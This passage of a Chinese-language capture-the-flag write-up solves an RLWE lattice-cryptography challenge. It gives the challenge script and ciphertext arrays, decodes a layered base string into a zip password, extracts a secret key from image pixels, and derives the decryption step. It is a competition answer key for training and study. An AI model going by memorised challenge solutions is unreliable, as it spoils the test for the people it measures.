guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line">key = jlkey(o, n, mod)</span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;fakeflag_xin_nian_kuai_le&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = jl(key, o, n, p, mod, m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;w =&quot;</span>, c[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v =&quot;</span>, c[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g =&quot;</span>, key[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w = [4456121292753321984, 2695388220323384832, 1125798304404134912, 1389165333028469760, 3720515311443086336, 1806160162087117824, 1710165564223285248, 3854525633894178816, 4160032803226148864, 3223993978734964736, 188029029972998144, 2283288149728718848, 178098730553155584, 400166020473782272, 4426677526375129088, 1768526165797007360, 4596103848246980608, 3143341953117548544, 4113813229295153152, 1444787342796136448, 1749143783191330816, 601663717837410304, 1976180375223943168, 899486064067571712, 2467702122158211072, 1442313048691163136, 2977506408218411008, 1106991111199326208, 844904722420957184, 1013497211561496576, 4250614525386129408, 1677797764964532224, 4212901529405988864, 2561734724771299328, 1890807629146202112, 951039123411230720, 881428262835757056, 514344970914586624, 3072465238399721472, 1294633561516974080, 4471068621313253376, 2978038764905480192, 1256294011046658048, 2885789906784919552, 1808546586690191360, 3846883621647482880, 422980376119787520, 3401510714240147456, 3024926897503240192, 3504641379026477056, 2686993749796929536, 4084804987293286400, 1949654215988994048, 2949577339713200128, 2514172581835300864, 614361226066452480, 1560522408220647424, 1215782736092413952, 1705607337158410240, 3789095360729792512, 126768310879952896, 3564560282876477440, 4112635401656336384, 488963213586022400, 3263989278014881792, 1190526290525741056, 3726804923972673536, 2773020963465314304, 2008550394681090048, 2877753734522249216, 3318721688589254656, 2685195110085615616, 2120287225013829632, 2837075008393977856, 680647261446750208, 2672034759831756800, 586790221783564288, 4413791420559310848, 753748175057453056, 4156435215025135616, 1753634903657668608, 3868573500772638720, 1065381465124585472, 1951729611177713664, 833463289401663488, 3083559584672243712, 2453364017450852352, 3187954181254758400, 2701962603281113088, 1657135743981748224, 3393942972234113024, 3224375546132267008, 1637663670848045056, 2226464092285288448, 3426678970486587392, 3746864906767974400, 892187878069846016, 1566105953383768064, 1841796609436766208, 102854404605427712, 1384852880673484800, 2187150610629812224, 3960839367218393088, 798293770690805760, 172119736121323520, 2434320282093170688, 3398926147058458624, 858963714965422080, 3371154991043334144, 1537312801335345152, 2963315646558453760, 4058550201296797696, 1544831164568528896, 4296983781331357696, 3597399236973740032, 1172234645379473408, 1811007296491237376, 1364782914640955392, 1942828798540959744, 1312644494190576640, 540671172853423104, 2521681537802540032, 3678999552996606976, 3522586936321518592, 3355286245326997504, 1724989423167225856, 2857616461138001920, 3550411157752463360]</span></span><br><span class="line"><span class="string">v = [3004075223514152960, 375766571298967040, 3918175633582001664, 298998053399571840, 4539733962165100544, 3415675319003214848, 557497174827461120, 1187181217327680512, 42761045408950272, 4539692406094923776, 3474777010512353280, 807990709249906688, 4401927180657766400, 628439373724332032, 3552565694197467136, 1229559664627433472, 2735485480783970304, 340251515454152704, 535029869298274304, 1089634905489248256, 1745435675342262272, 2211405319829864448, 3166387633265565696, 3356595592575791104, 811586262403354624, 1658544963444764672, 2801381922146680832, 1906405005677551616, 2764661089781948416, 348852661152833536, 2843732326950182912, 3655220640882900992, 2735228541582770176, 984245520265568256, 847631674608009216, 4278557074339209216, 354445030770749440, 552426514839019520, 3037890003690143744, 3845527152479436800, 686613871844605952, 1987014853275738112, 129221415412514816, 884028654840045568, 893161048767537152, 4428861422755028992, 1977654893495033856, 2683055322869915648, 4466344498597339136, 2820131774980661248, 2105607478169853952, 768444766180638720, 212987987936600064, 1576117523911901184, 1650389830627762176, 1915750840791851008, 4109009172913405952, 2218053892260061184, 3863963349465956352, 2990430210085863424, 1274030477779271680, 1711547929466978304, 1157679433574768640, 156097645996949504, 3695677787747401728, 4322888783310766080, 4546024412016992256, 2655974462028947456, 1604656974594400256, 2045021548923273216, 3161689730583207936, 8339332591755263, 2341948229963612160, 3607706207127453696, 469234496887414784, 973715854261501952, 789210633607102464, 4424949506055979008, 1542517731370860544, 182468406585786368, 1807090988320792576, 1850374377172516864, 2618527682038956032, 1262867559425187840, 938222240300924928, 4591256432328728576, 2044671823654682624, 3467964150293766144, 79543117595951104, 2185630104198291456, 3728244444110430208, 156056289984327680, 4390349499275018240, 1751182369256157184, 2162985531302232064, 2761554017168584704, 2829764058526203904, 2028689816016191488, 146286463995781120, 3720834471976288256, 2917463735459491840, 4566476477728677888, 3722002688823242752, 4245856959119122432, 3425954365963665408, 3618936531494342656, 3695636186696466432, 1423352273706041344, 158921080583421952, 4351926341975711744, 3376292832678187008, 3295795181429579776, 3267875754319810560, 2363850527793784832, 888488262224822272, 1097387081646508032, 3686827109357189120, 297511993689784320, 3698586652027076608, 1126524981060736000, 1227462499250052096, 195965752955788032, 378621325977167872, 4568860371418834944, 3806982850127191040, 2330191690590402560, 965690431040995328, 2254601344237207552]</span></span><br><span class="line"><span class="string">g = [1271385667288255999, 3597939031086288160, 948720385886874982, 3730034896312885091, 155961058571645646, 873298702409407364, 3695415802847080551, 3935805697420664465, 303427777773526115, 2121504102169723388, 3117842710535023914, 2004730725267082784, 315298886702225235, 711790101004272712, 3469726824196756845, 3649946521480214795, 4269586158067475466, 1607685984041888423, 1866766258134518609, 4115571819844332380, 2381299916655519619, 2208948036365614734, 1946214530009282102, 330799912617809735, 3460498231343524429, 2694359423578749492, 793704330311549271, 1491532600134534859, 1606672420502700650, 561106526228105342, 1105025457886824442, 1443932433209975334, 4240908184445005305, 1954646486670721382, 4227369777555389059, 1563814260527576306, 771217858163031033, 1280424786084049063, 303853418224126180, 181918673882271714, 2212581027220765469, 2111888312694611250, 3581354821166105988, 1429049683930421764, 1357441041735699015, 3553280165847887597, 869489768651033960, 1107714765447012644, 2910143081602408601, 1433461290183315706, 3240132019514117541, 2465292834002904411, 1334470694725903257, 3156578894981065904, 35185442949043438, 645993467993501426, 1352915688916657829, 1521946784078789166, 2639858512187877401, 4315064694485922395, 3953315792354490874, 1587769214913102261, 3912000075342935904, 1887499577531299413, 309657057763429254, 769590223035802807, 4361036733963754384, 1446528785602732156, 1205711736426995533, 3683188791797133788, 921287773622604679, 3591274357626650529, 2745859155549230842, 4491978210538609848, 2444128709624329128, 1403888264551474491, 4377727165055311964, 1507498290240201527, 2952796830041690744, 1642562262970195060, 2847743992975447391, 4164239208310834247, 1967003682977431435, 2575799088251274004, 156708464748056204, 2403917842083313594, 55721043545237639, 239916744182811448, 134638877854791156, 76687455444928683, 3051612621194354938, 4253947515818696559, 392166402534779315, 5415521347314633, 1816697745794261287, 2282876916808180261, 3667412627019328976, 4211876289328416715, 1647128252024708114, 3721877072126461741, 2297068963395433648, 398583411660274597, 3562855580894975650, 1322989240042277117, 3551729861626536144, 2816759739903316271, 2629395545611893101, 1799561289667084873, 2629410111371391637, 1398369600901640698, 447266788926484707, 405213767544537836, 3014220918160576578, 747208265285548041, 1727187447678753569, 3063564852472463780, 1502638600503176791, 3284205888928186113, 3412854446691461073, 3937011809364193960, 1208514509487198642, 3063044796627572289, 2532417142719581087, 375928502591586817, 2839325684818922862, 4472409225244809142, 1384186637673587546, 1680318030162086049]</span></span><br><span class="line"><span class="string">t = [3482937270284373504, 3729542463939501056, 1354530592839269376, 2340035975483411456, 3318144666530505728, 4321971466042776576, 4107840020098758656, 2600042509314867200, 3185315495632337920, 2510425761632839680, 3758844697217568768, 1813627045100445696, 1035634427310004224, 1650895865179787264, 931858574122051584, 3821738968282525696, 751354306590687232, 812159733109825536, 1984846083975063552, 426674528748978176, 1786129270688538624, 53204613942820864, 4207648582990901248, 2441413890227052544, 4573249524143439872, 2901255116891488256, 3331287389413953536, 1594453621617430528, 7636565623463936, 3261865719383670784, 3211543945355886592, 4414864510393499648, 1781787468450406400, 4381257290165919744, 1683943310183464960, 1618102318685454336, 3082727664554508288, 1284750602156802048, 4536273674447527936, 4224428964375134208, 1990811212107251712, 220641709431201792, 56727929599156224, 1394394833783595008, 474539825790402560, 2367070412709519360, 86013256530493440, 3983263247386468352, 4488230536002330624, 1131832099054157824, 4470326732790874112, 2361104703887433728, 1850267988673478656, 519014833878171648, 2447115942472581120, 2567048274520276992, 3409815404144214016, 2569012418791473152, 2239861171203006464, 3207035079062069248, 1423032481934245888, 3660676895628648448, 3197924030326439936, 2173721402472767488, 1836499846562930688, 1193190307175825408, 2757965850888388608, 3833547905923039232, 113362523505639424, 2095507640221974528, 695818728283136000, 2746136108677742592, 80271849461956608, 544596706215608320, 857894362373431296, 1801819582386577408, 2748888436946362368, 1760827740054806528, 2544591920627023872, 4324861829346312192, 3073160513540464640, 3260750497480876032, 1268136159796920320, 2738758060057362432, 460370852221685760, 3694812482865025024, 674485732026892288, 31827325234905088, 1076067066569760768, 3538749128687951872, 4553745898606747648, 3332219178735149056, 329835532944998400, 4576690061027602432, 3023286444576161792, 1797946474203955200, 4558389623053447168, 1790588264296259584, 3017170271014150144, 991463616551034880, 1940023178234544128, 3414390445152993280, 644333657859764224, 3692106158122917888, 3167684436092710912, 789204772426006528, 4353661356398166016, 2000540208800374784, 3942168043465134080, 3332450567729246208, 2627875622523490304, 9371534919516160, 848644069081235456, 2192689498702295040, 907016265148577792, 2645935549696630784, 2590866188404383744, 3750676748846913536, 3694849270404139008, 4268369840164233216, 3556945000413347840, 1995615102316576768, 4445424004994387968, 2929133498761163776, 2462149674675616768, 741748174115656704, 39754566828455680, 4477497218304360448]</span></span><br><span class="line"><span class="string">jjgqJn00BoV2m68QERWUCmah8h86UJERRsVhfzEzy9hBwi0GJ5MyEzBCQS5r0yr7GrdM5d0ptnBWLzfywakvSlRJvex1efrtHiDVNo4WQZjopk4N3RFi4D</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先解最后的base，base62-base32-base58-base64-base62解得 <code>wo_shi_yhhhh_de_fen_si</code>。</p><p>用此作为密码解压得到一个 s.png，提取像素值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;YOUQU/s.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        s.append(tmp)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = [1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]</span></span><br></pre></td></tr></table></figure><p>加密部分是一个RLWE，定义了一个多项式商环 $F_p[x]=\cfrac{Z_p[x]}{f(x)}$，随机列表为商环上的多项式系数列表。</p><p>加密函数 </p><p>$t(x) \equiv -s(x)g(x)+e_1(x) \pmod p$</p><p>$w(x) \equiv t(x)r(x)+e_2(x)+d\cdot m(x) \pmod p$</p><p>$v(x) \equiv g(x)r(x)+e_3(x) \pmod p$</p><p>已知私钥 $s(x)$，则</p><p>$w+s\cdot v=(t\cdot r+e_2+d\cdot m)+s(g\cdot r+e_3)=-s\cdot g\cdot r+e_1\cdot r+e_2+d\cdot m+s\cdot g\cdot r+s\cdot e_3=d\cdot m+(e_1\cdot r+e_2+s\cdot e_3)$</p><p>可以发现，后面的 $e\cdot r+e_2+s\cdot e_3$ 仍然是个小噪声， 有</p><p>$(w+s\cdot v) \bmod d = m$</p><p>噪声可能满足 $e_1\cdot r+e_2+s\cdot e_3&lt;0$ ，为负值的时候，会出现 $(w+s\cdot v) \bmod d = m&lt;1$ ，需对应处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">w = [<span class="number">4456121292753321984</span>, <span class="number">2695388220323384832</span>, <span class="number">1125798304404134912</span>, <span class="number">1389165333028469760</span>, <span class="number">3720515311443086336</span>, <span class="number">1806160162087117824</span>, <span class="number">1710165564223285248</span>, <span class="number">3854525633894178816</span>, <span class="number">4160032803226148864</span>, <span class="number">3223993978734964736</span>, <span class="number">188029029972998144</span>, <span class="number">2283288149728718848</span>, <span class="number">178098730553155584</span>, <span class="number">400166020473782272</span>, <span class="number">4426677526375129088</span>, <span class="number">1768526165797007360</span>, <span class="number">4596103848246980608</span>, <span class="number">3143341953117548544</span>, <span class="number">4113813229295153152</span>, <span class="number">1444787342796136448</span>, <span class="number">1749143783191330816</span>, <span class="number">601663717837410304</span>, <span class="number">1976180375223943168</span>, <span class="number">899486064067571712</span>, <span class="number">2467702122158211072</span>, <span class="number">1442313048691163136</span>, <span class="number">2977506408218411008</span>, <span class="number">1106991111199326208</span>, <span class="number">844904722420957184</span>, <span class="number">1013497211561496576</span>, <span class="number">4250614525386129408</span>, <span class="number">1677797764964532224</span>, <span class="number">4212901529405988864</span>, <span class="number">2561734724771299328</span>, <span class="number">1890807629146202112</span>, <span class="number">951039123411230720</span>, <span class="number">881428262835757056</span>, <span class="number">514344970914586624</span>, <span class="number">3072465238399721472</span>, <span class="number">1294633561516974080</span>, <span class="number">4471068621313253376</span>, <span class="number">2978038764905480192</span>, <span class="number">1256294011046658048</span>, <span class="number">2885789906784919552</span>, <span class="number">1808546586690191360</span>, <span class="number">3846883621647482880</span>, <span class="number">422980376119787520</span>, <span class="number">3401510714240147456</span>, <span class="number">3024926897503240192</span>, <span class="number">3504641379026477056</span>, <span class="number">2686993749796929536</span>, <span class="number">4084804987293286400</span>, <span class="number">1949654215988994048</span>, <span class="number">2949577339713200128</span>, <span class="number">2514172581835300864</span>, <span class="number">614361226066452480</span>, <span class="number">1560522408220647424</span>, <span class="number">1215782736092413952</span>, <span class="number">1705607337158410240</span>, <span class="number">3789095360729792512</span>, <span class="number">126768310879952896</span>, <span class="number">3564560282876477440</span>, <span class="number">4112635401656336384</span>, <span class="number">488963213586022400</span>, <span class="number">3263989278014881792</span>, <span class="number">1190526290525741056</span>, <span class="number">3726804923972673536</span>, <span class="number">2773020963465314304</span>, <span class="number">2008550394681090048</span>, <span class="number">2877753734522249216</span>, <span class="number">3318721688589254656</span>, <span class="number">2685195110085615616</span>, <span class="number">2120287225013829632</span>, <span class="number">2837075008393977856</span>, <span class="number">680647261446750208</span>, <span class="number">2672034759831756800</span>, <span class="number">586790221783564288</span>, <span class="number">4413791420559310848</span>, <span class="number">753748175057453056</span>, <span class="number">4156435215025135616</span>, <span class="number">1753634903657668608</span>, <span class="number">3868573500772638720</span>, <span class="number">1065381465124585472</span>, <span class="number">1951729611177713664</span>, <span class="number">833463289401663488</span>, <span class="number">3083559584672243712</span>, <span class="number">2453364017450852352</span>, <span class="number">3187954181254758400</span>, <span class="number">2701962603281113088</span>, <span class="number">1657135743981748224</span>, <span class="number">3393942972234113024</span>, <span class="number">3224375546132267008</span>, <span class="number">1637663670848045056</span>, <span class="number">2226464092285288448</span>, <span class="number">3426678970486587392</span>, <span class="number">3746864906767974400</span>, <span class="number">892187878069846016</span>, <span class="number">1566105953383768064</span>, <span class="number">1841796609436766208</span>, <span class="number">102854404605427712</span>, <span class="number">1384852880673484800</span>, <span class="number">2187150610629812224</span>, <span class="number">3960839367218393088</span>, <span class="number">798293770690805760</span>, <span class="number">172119736121323520</span>, <span class="number">2434320282093170688</span>, <span class="number">3398926147058458624</span>, <span class="number">858963714965422080</span>, <span class="number">3371154991043334144</span>, <span class="number">1537312801335345152</span>, <span class="number">2963315646558453760</span>, <span class="number">4058550201296797696</span>, <span class="number">1544831164568528896</span>, <span class="number">4296983781331357696</span>, <span class="number">3597399236973740032</span>, <span class="number">1172234645379473408</span>, <span class="number">1811007296491237376</span>, <span class="number">1364782914640955392</span>, <span class="number">1942828798540959744</span>, <span class="number">1312644494190576640</span>, <span class="number">540671172853423104</span>, <span class="number">2521681537802540032</span>, <span class="number">3678999552996606976</span>, <span class="number">3522586936321518592</span>, <span class="number">3355286245326997504</span>, <span class="number">1724989423167225856</span>, <span class="number">2857616461138001920</span>, <span class="number">3550411157752463360</span>]</span><br><span class="line">v = [<span class="number">3004075223514152960</span>, <span class="number">375766571298967040</span>, <span class="number">3918175633582001664</span>, <span class="number">298998053399571840</span>, <span class="number">4539733962165100544</span>, <span class="number">3415675319003214848</span>, <span class="number">557497174827461120</span>, <span class="number">1187181217327680512</span>, <span class="number">42761045408950272</span>, <span class="number">4539692406094923776</span>, <span class="number">3474777010512353280</span>, <span class="number">807990709249906688</span>, <span class="number">4401927180657766400</span>, <span class="number">628439373724332032</span>, <span class="number">3552565694197467136</span>, <span class="number">1229559664627433472</span>, <span class="number">2735485480783970304</span>, <span class="number">340251515454152704</span>, <span class="number">535029869298274304</span>, <span class="number">1089634905489248256</span>, <span class="number">1745435675342262272</span>, <span class="number">2211405319829864448</span>, <span class="number">3166387633265565696</span>, <span class="number">3356595592575791104</span>, <span class="number">811586262403354624</span>, <span class="number">1658544963444764672</span>, <span class="number">2801381922146680832</span>, <span class="number">1906405005677551616</span>, <span class="number">2764661089781948416</span>, <span class="number">348852661152833536</span>, <span class="number">2843732326950182912</span>, <span class="number">3655220640882900992</span>, <span class="number">2735228541582770176</span>, <span class="number">984245520265568256</span>, <span class="number">847631674608009216</span>, <span class="number">4278557074339209216</span>, <span class="number">354445030770749440</span>, <span class="number">552426514839019520</span>, <span class="number">3037890003690143744</span>, <span class="number">3845527152479436800</span>, <span class="number">686613871844605952</span>, <span class="number">1987014853275738112</span>, <span class="number">129221415412514816</span>, <span class="number">884028654840045568</span>, <span class="number">893161048767537152</span>, <span class="number">4428861422755028992</span>, <span class="number">1977654893495033856</span>, <span class="number">2683055322869915648</span>, <span class="number">4466344498597339136</span>, <span class="number">2820131774980661248</span>, <span class="number">2105607478169853952</span>, <span class="number">768444766180638720</span>, <span class="number">212987987936600064</span>, <span class="number">1576117523911901184</span>, <span class="number">1650389830627762176</span>, <span class="number">1915750840791851008</span>, <span class="number">4109009172913405952</span>, <span class="number">2218053892260061184</span>, <span class="number">3863963349465956352</span>, <span class="number">2990430210085863424</span>, <span class="number">1274030477779271680</span>, <span class="number">1711547929466978304</span>, <span class="number">1157679433574768640</span>, <span class="number">156097645996949504</span>, <span class="number">3695677787747401728</span>, <span class="number">4322888783310766080</span>, <span class="number">4546024412016992256</span>, <span class="number">2655974462028947456</span>, <span class="number">1604656974594400256</span>, <span class="number">2045021548923273216</span>, <span class="number">3161689730583207936</span>, <span class="number">8339332591755263</span>, <span class="number">2341948229963612160</span>, <span class="number">3607706207127453696</span>, <span class="number">469234496887414784</span>, <span class="number">973715854261501952</span>, <span class="number">789210633607102464</span>, <span class="number">4424949506055979008</span>, <span class="number">1542517731370860544</span>, <span class="number">182468406585786368</span>, <span class="number">1807090988320792576</span>, <span class="number">1850374377172516864</span>, <span class="number">2618527682038956032</span>, <span class="number">1262867559425187840</span>, <span class="number">938222240300924928</span>, <span class="number">4591256432328728576</span>, <span class="number">2044671823654682624</span>, <span class="number">3467964150293766144</span>, <span class="number">79543117595951104</span>, <span class="number">2185630104198291456</span>, <span class="number">3728244444110430208</span>, <span class="number">156056289984327680</span>, <span class="number">4390349499275018240</span>, <span class="number">1751182369256157184</span>, <span class="number">2162985531302232064</span>, <span class="number">2761554017168584704</span>, <span class="number">2829764058526203904</span>, <span class="number">2028689816016191488</span>, <span class="number">146286463995781120</span>, <span class="number">3720834471976288256</span>, <span class="number">2917463735459491840</span>, <span class="number">4566476477728677888</span>, <span class="number">3722002688823242752</span>, <span class="number">4245856959119122432</span>, <span class="number">3425954365963665408</span>, <span class="number">3618936531494342656</span>, <span class="number">3695636186696466432</span>, <span class="number">1423352273706041344</span>, <span class="number">158921080583421952</span>, <span class="number">4351926341975711744</span>, <span class="number">3376292832678187008</span>, <span class="number">3295795181429579776</span>, <span class="number">3267875754319810560</span>, <span class="number">2363850527793784832</span>, <span class="number">888488262224822272</span>, <span class="number">1097387081646508032</span>, <span class="number">3686827109357189120</span>, <span class="number">297511993689784320</span>, <span class="number">3698586652027076608</span>, <span class="number">1126524981060736000</span>, <span class="number">1227462499250052096</span>, <span class="number">195965752955788032</span>, <span class="number">378621325977167872</span>, <span class="number">4568860371418834944</span>, <span class="number">3806982850127191040</span>, <span class="number">2330191690590402560</span>, <span class="number">965690431040995328</span>, <span class="number">2254601344237207552</span>]</span><br><span class="line">g = [<span class="number">1271385667288255999</span>, <span class="number">3597939031086288160</span>, <span class="number">948720385886874982</span>, <span class="number">3730034896312885091</span>, <span class="number">155961058571645646</span>, <span class="number">873298702409407364</span>, <span class="number">3695415802847080551</span>, <span class="number">3935805697420664465</span>, <span class="number">303427777773526115</span>, <span class="number">2121504102169723388</span>, <span class="number">3117842710535023914</span>, <span class="number">2004730725267082784</span>, <span class="number">315298886702225235</span>, <span class="number">711790101004272712</span>, <span class="number">3469726824196756845</span>, <span class="number">3649946521480214795</span>, <span class="number">4269586158067475466</span>, <span class="number">1607685984041888423</span>, <span class="number">1866766258134518609</span>, <span class="number">4115571819844332380</span>, <span class="number">2381299916655519619</span>, <span class="number">2208948036365614734</span>, <span class="number">1946214530009282102</span>, <span class="number">330799912617809735</span>, <span class="number">3460498231343524429</span>, <span class="number">2694359423578749492</span>, <span class="number">793704330311549271</span>, <span class="number">1491532600134534859</span>, <span class="number">1606672420502700650</span>, <span class="number">561106526228105342</span>, <span class="number">1105025457886824442</span>, <span class="number">1443932433209975334</span>, <span class="number">4240908184445005305</span>, <span class="number">1954646486670721382</span>, <span class="number">4227369777555389059</span>, <span class="number">1563814260527576306</span>, <span class="number">771217858163031033</span>, <span class="number">1280424786084049063</span>, <span class="number">303853418224126180</span>, <span class="number">181918673882271714</span>, <span class="number">2212581027220765469</span>, <span class="number">2111888312694611250</span>, <span class="number">3581354821166105988</span>, <span class="number">1429049683930421764</span>, <span class="number">1357441041735699015</span>, <span class="number">3553280165847887597</span>, <span class="number">869489768651033960</span>, <span class="number">1107714765447012644</span>, <span class="number">2910143081602408601</span>, <span 